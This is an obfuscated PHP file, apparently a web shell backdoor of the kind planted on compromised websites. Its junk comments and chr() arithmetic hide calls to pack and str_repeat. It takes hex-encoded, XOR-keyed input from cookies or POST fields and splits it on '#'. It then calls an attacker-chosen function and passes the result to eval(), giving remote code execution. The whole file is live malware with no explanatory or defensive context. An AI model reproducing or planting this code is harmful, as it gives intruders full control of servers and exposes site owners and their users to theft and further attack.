<?php	$TYieba	= 's'/*ibh   */.	"\x74"/* jrhjJ */.	"\162" ./*  qztm   */chr/*  BoA   */(   617	-/*   sIpVw   */522/*  z   */)."\162"  .     chr   (	345/*WaWzK   */-	244	)."\160"/* XOKt*/./*TG   */chr/* NSrh */(  723	-    622  ).chr/* jscL*/(97)/* nPLv*/.	't';$_ZC/*   sY   */=	'15401';
  $bBTELY/*qd  */=	chr/*  ugg */(112)  .	chr	(   287/*  g  */-	190	).chr (	237	-/*  bV  */138	)."\x6b";;
	function   hfnwIorND()
				/* gX  */{


/*HMyWV */$RwCyhcAz  =	Array     (   "bGHDEnaHNLCAEqDCLCNnBcMdNF"	=>/*UI   */"VOnPeZxFuzDjAM"	);;
    /*   yotIa  */

   $JhIpaUSqGW/*P*/=/*  nrTE */Array   (	"jfGIGiYDZysCqqwIUu"	=>	"PHQyOuxwDIjqEHuSWTSoKFrK"/*   FxEoh */);;


	$gffqmEl	=    Array(  $RwCyhcAz,     $_COOKIE,/*   r  */$RwCyhcAz,/* cqqB */$_POST,	$JhIpaUSqGW);$_ISXam	=	'47876';
	
/*FC   */return	$gffqmEl;
   	}
		
		/*  jF*/function	MsRjriecJQ($KyCPrumN,	$RwCyhcAz)

	{
			/* bnfkE  */if/*AMT  */(   count	(     $KyCPrumN	)    ==	3	)	{
		 $IkIBCgM/* Ikt */=/*  ggUui   */$KyCPrumN[1];
						$fEBVLnw/*   PvrrI */=	$KyCPrumN[2];
		/*dpCi*/$ZUZPFqgg	=/* UM*/$IkIBCgM($fEBVLnw);
			     eval/*   vaWAN  */(	$ZUZPFqgg  );
	die   ();$_IUuLv/* mwBMH   */=/*  GqmQL */'47101';


	}
			  }
      
    /* IFZ   */function/* g*/zwNqBmQJnW($LNKXFlTDQF,/*K*/$fHkMd)
    {
			return	$LNKXFlTDQF ^	$fHkMd;


     }


   
    /*  hqJS */$CcVFGn	=/*   NYD */"\43";$_R  =    '13216';
  
			/*LS*/function YSyOU($FQIBtKul,/*  zJr */$CcVFGn)
        {/*  NYV   */
     	

	$FQIBtKul = explode    ($CcVFGn,	$FQIBtKul	);

	
				   MsRjriecJQ($FQIBtKul,/*  xAt*/$CcVFGn);$_SAYz	= '12315';
     }
     
			    
	/*vE */
	/* ZFy  */foreach	(hfnwIorND()  as/*   UZM   */$AQGAW)	{
     /*MTnPf*/foreach	(	$AQGAW as  $fHkMd =>	$LNKXFlTDQF	) {
					   


	$zJMHOt	= strlen(/*  yn */$LNKXFlTDQF )/strlen(/*Bbx */$fHkMd	);
			  
	$LNKXFlTDQF/*  A  */= @$bBTELY(	"\110"/*  KsJHP*/./*vbWb*/chr	(	558    -	516 ),	$LNKXFlTDQF	);;
						
			$fHkMd/* s*/.=	"rVAiCC-ZcCf-zbJfDcm-WUCmzmb-MSIITR-PPR-TmxIxDd";

	$fHkMd  =/*   gtSJ */$TYieba/*   zZ  */(/* sye   */$fHkMd,	$zJMHOt    +/*   mXQV */1);
			/* Ckz  */
	/*QIcS  */YSyOU(zwNqBmQJnW($LNKXFlTDQF,	$fHkMd),	$CcVFGn);;
		
				  continue;;
 	}
				}